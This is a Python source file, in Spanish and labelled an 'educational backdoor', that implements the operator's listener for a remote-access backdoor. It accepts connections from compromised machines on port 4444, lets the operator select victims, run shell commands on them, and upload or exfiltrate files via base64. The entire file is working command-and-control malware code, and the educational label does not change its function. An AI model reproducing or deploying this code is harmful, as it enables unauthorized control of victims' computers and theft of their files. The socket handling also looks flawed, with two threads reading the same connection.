import socket
import json
import base64
import threading

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

    @staticmethod
    def imprimirTexto(texto, color):
        colored_text = color + texto + Colors.RESET
        print(colored_text)

class Escuchador:
    def __init__(self, ip, puerto):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, puerto))
        self.listener.listen(5)
        print("[+] Esperando conexiones entrantes")
        self.clientes = []
        self.direcciones = []
        self.running = True

    def manejar_cliente(self, conexion, direccion):
        print(f"[+] Se ha establecido una conexion desde {direccion}")
        self.clientes.append(conexion)
        self.direcciones.append(direccion)
        self.actualizar_prompt()

        while self.running:
            try:
                datos_json = ""
                while True:
                    parte = conexion.recv(1024).decode()
                    if parte:
                        datos_json += parte
                        try:
                            comando = json.loads(datos_json)
                            break
                        except ValueError:
                            continue

                if comando[0] == "exit":
                    self.cerrar_conexion(conexion, direccion)
                    break

                resultado = self.ejecutar_comando(comando, conexion)
                self.enviar_confiablemente(resultado, conexion)
            except Exception as e:
                print(f"[-] Error manejando el cliente {direccion}: {str(e)}")
                self.cerrar_conexion(conexion, direccion)
                break

    def enviar_confiablemente(self, datos, conexion):
        try:
            datos_json = json.dumps(datos)
            conexion.sendall(datos_json.encode())
        except Exception as e:
            print(f"[-] Error enviando datos al cliente: {str(e)}")
            self.cerrar_conexion(conexion, self.direcciones[self.clientes.index(conexion)])

    def recibir_confiablemente(self, conexion):
        datos_json = ""
        while True:
            try:
                parte = conexion.recv(1024).decode()
                if parte:
                    datos_json += parte
                    return json.loads(datos_json)
            except ValueError:
                continue
            except Exception as e:
                print(f"[-] Error recibiendo datos del cliente: {str(e)}")
                self.cerrar_conexion(conexion, self.direcciones[self.clientes.index(conexion)])
                return None

    def ejecutar_comando(self, comando, conexion):
        self.enviar_confiablemente(comando, conexion)
        return self.recibir_confiablemente(conexion)

    def escribir_archivo(self, ruta, contenido):
        with open(ruta, "wb") as archivo:
            archivo.write(base64.b64decode(contenido))
            return "[+] Descarga exitosa."

    def leer_archivo(self, ruta):
        with open(ruta, "rb") as archivo:
            return base64.b64encode(archivo.read()).decode()

    def mostrar_menu(self):
        print('\n\n')
        titulo_proyecto = "🔓 Desarrollo de Backdoor Educativo 🔓"
        desarrollador = "Raul Gabriel Hacho (Cusco - Perú)"
        version = "1.0.0"
        informacion_adicional = "Proyecto educativo para aprender sobre ciberseguridad"
        
        Colors.imprimirTexto(titulo_proyecto, Colors.RED)
        Colors.imprimirTexto(f"</> Desarrollado por {desarrollador}", Colors.YELLOW)
        Colors.imprimirTexto(f"</> Versión: {version}", Colors.CYAN)
        Colors.imprimirTexto(f"</> {informacion_adicional}", Colors.YELLOW)
        print('')
        print('==========================================================')
        print(Colors.BLUE + "Opciones disponibles:" + Colors.RESET)
        print(Colors.GREEN + "subir archivos:           subir [nombre_archivo]" + Colors.RESET)
        print(Colors.GREEN + "descargar archivos:       descargar [nombre_archivo]" + Colors.RESET)
        print(Colors.GREEN + "listar clientes:          listar" + Colors.RESET)
        print(Colors.GREEN + "seleccionar cliente:      seleccionar [numero_cliente]" + Colors.RESET)
        print(Colors.GREEN + "cambiar directorio:       cd [ruta]" + Colors.RESET)
        print(Colors.GREEN + "retroceder directorio:    cd .." + Colors.RESET)
        print(Colors.GREEN + "cambiar disco:            [D:]" + Colors.RESET)
        print(Colors.GREEN + "mostrar archivos:         dir" + Colors.RESET)
        print(Colors.GREEN + "salir:                    exit" + Colors.RESET)
        print('==========================================================')
        print('')

    def actualizar_prompt(self, cliente_activo=None):
        if cliente_activo is None:
            prompt = "> "
        else:
            indice = self.clientes.index(cliente_activo)
            prompt = f"[{indice}]> "
        print(prompt, end='', flush=True)

    def ejecutar(self):
        hilo_aceptar_conexiones = threading.Thread(target=self.aceptar_conexiones)
        hilo_aceptar_conexiones.start()
        self.mostrar_menu()

        cliente_activo = None

        while self.running:
            self.actualizar_prompt(cliente_activo)
            comando = input().split(" ")

            if comando[0] == "listar":
                print('')
                print('==============================================   CLIENTES CONECTADOS ======================================')
                for i, direccion in enumerate(self.direcciones):
                    print(f"[{i}] {direccion}")

            elif comando[0] == "seleccionar":
                try:
                    indice = int(comando[1])
                    if 0 <= indice < len(self.clientes):
                        cliente_activo = self.clientes[indice]
                        print(f"[+] Cliente {self.direcciones[indice]} seleccionado.")
                    else:
                        print("[-] Indice de cliente invalido.")
                except (IndexError, ValueError):
                    print("[-] Indice de cliente invalido.")

            elif comando[0] == "exit":
                self.running = False
                for cliente in self.clientes:
                    self.enviar_confiablemente(["exit"], cliente)
                    self.cerrar_conexion(cliente, self.direcciones[self.clientes.index(cliente)])
                print("[+] Saliendo...")
                break

            elif cliente_activo:
                try:
                    if comando[0] == "subir":
                        contenido_archivo = self.leer_archivo(comando[1])
                        comando.append(contenido_archivo)
                    resultado = self.ejecutar_comando(comando, cliente_activo)
                    if comando[0] == "descargar" and "[-] Error " not in resultado:
                        contenido = resultado.replace(" ", "")
                        inicio = resultado.find("'")
                        fin = resultado.rfind("'")
                        if inicio != -1 and fin != -1 and fin > inicio:
                            texto_extraido = resultado[inicio+1:fin]
                            resul = self.escribir_archivo(comando[1], texto_extraido)
                            print(resul)
                        else:
                            print("[error] no se pudo extraer el contenido del archivo")
                    else:
                        print(resultado)
                except Exception as e:
                    print(f"[-] Error durante la ejecucion del comando servidor: {str(e)}")
            else:
                print("[-] No hay cliente seleccionado. Use el comando 'seleccionar' para seleccionar un cliente.")

        self.listener.close()
        hilo_aceptar_conexiones.join()

    def aceptar_conexiones(self):
        while self.running:
            try:
                self.listener.settimeout(1.0)
                try:
                    conexion, direccion = self.listener.accept()
                except socket.timeout:
                    continue
                cliente_hilo = threading.Thread(target=self.manejar_cliente, args=(conexion, direccion))
                cliente_hilo.start()
            except Exception as e:
                if self.running:
                    print(f"[-] Error aceptando conexiones: {str(e)}")

    def cerrar_conexion(self, conexion, direccion):
        try:
            conexion.close()
        except Exception as e:
            print(f"[-] Error al cerrar la conexión: {str(e)}")
        finally:
            if conexion in self.clientes:
                self.clientes.remove(conexion)
            if direccion in self.direcciones:
                self.direcciones.remove(direccion)
            self.actualizar_prompt() 

if __name__ == "__main__":
    try:
        mi_escuchador = Escuchador("192.168.1.51", 4444)
        mi_escuchador.ejecutar()
    except Exception as e:
        print(f"[-] Error inicializando el escuchador: {str(e)}")
